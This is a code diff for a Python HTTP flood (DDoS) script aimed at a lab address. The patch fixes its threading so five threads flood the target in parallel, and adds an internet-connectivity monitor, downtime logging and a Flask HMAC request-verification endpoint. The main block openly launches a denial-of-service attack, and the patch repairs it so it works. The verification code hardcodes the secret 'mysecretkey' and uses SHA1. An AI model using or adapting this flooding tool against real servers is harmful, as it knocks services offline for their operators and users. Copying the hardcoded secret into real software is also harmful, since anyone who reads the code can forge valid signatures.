@@ -6,6 +6,11 @@ import urllib3
 from datetime import datetime, timedelta
 import time
 import ipaddress
+import socket
+import os
+import hmac
+import hashlib
+from flask import Flask, request
 
 urllib3.disable_warnings()
 
@@ -34,6 +39,36 @@ blocked_ips = [
     "10.0.2.15",
     "192.168.1.100"
 ]
+
+# Define the log file path
+FILE = os.path.join(os.getcwd(), "networkinfo.log")
+
+# Secret key for request validation (replace with your own secret)
+SECRET_KEY = "mysecretkey"
+
+app = Flask(__name__)
+
+@app.route("/verify_request", methods=["POST"])
+def verify_request():
+    try:
+        # Read the request data
+        data = request.get_data()
+
+        # Extract the provided signature from the request headers
+        provided_signature = request.headers.get("X-Signature")
+
+        # Calculate the expected signature using HMAC-SHA1
+        expected_signature = "sha1=" + hmac.new(SECRET_KEY.encode("utf-8"), data, hashlib.sha1).hexdigest()
+
+        # Compare the provided and expected signatures
+        if hmac.compare_digest(provided_signature, expected_signature):
+            return "Request is valid. Proceed with further processing."
+        else:
+            return "Anomaly detected: Invalid request signature."
+
+    except Exception as e:
+        return f"Error verifying request: {str(e)}"
+
 
 
 def show_logs():
@@ -112,20 +147,70 @@ def http_flood(target_url, num_of_requests):
             print(f"Error: {str(e)}")
 
 
+def ping():
+    try:
+        socket.setdefaulttimeout(3)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        host = "8.8.8.8"  # Google's DNS server
+        port = 53
+        server_address = (host, port)
+        s.connect(server_address)
+    except OSError:
+        return False
+    else:
+        s.close()
+        return True
+
+
+def calculate_time(start, stop):
+    difference = stop - start
+    seconds = float(str(difference.total_seconds()))
+    return str(timedelta(seconds=seconds)).split(".")[0]
+
+
+def first_check():
+    # Check if the system is already connected to the internet
+    if ping():
+        with open(FILE, "a") as log_file:
+            log_file.write(f"{datetime.now()} - Connected\n")
+    else:
+        with open(FILE, "a") as log_file:
+            log_file.write(f"{datetime.now()} - Disconnected\n")
+
+
 if __name__ == "__main__":
-    target_url = "https://10.0.2.15/real-estate-html-template/index.html"
+    target_url = "http://10.0.2.15/real-estate-html-template/index.html"
     num_of_requests = 100
 
     print(f"Starting http flood, targeting {target_url}")
 
-    # Creates and sends multiple threads synchronously
-    threads = []
-    for _ in range(5):
-        thread = threading.Thread(target=http_flood(target_url, num_of_requests))
-        threads.append(thread)
-        thread.start()
+    first_check()
 
-    for thread in threads:
-        thread.join()
+    # Continuously monitor and log network status
+    while True:
+        if ping():
+            # Internet connection is available
+            threads = []
+            for _ in range(5):
+                thread = threading.Thread(target=http_flood, args=(target_url, num_of_requests))
+                threads.append(thread)
+                thread.start()
 
-    print(f"DDoS attack finished.")
+            for thread in threads:
+                thread.join()
+
+            print(f"DDoS attack finished.")
+
+            break
+        else:
+            # Internet connection is lost
+            start_time = datetime.now()
+            while not ping():
+                pass
+            stop_time = datetime.now()
+            downtime = calculate_time(start_time, stop_time)
+            with open(FILE, "a") as log_file:
+                log_file.write(f"{start_time} - Disconnected ({downtime})\n")
+
+    # Run the Flask app
+    app.run(host="0.0.0.0", port=5000)
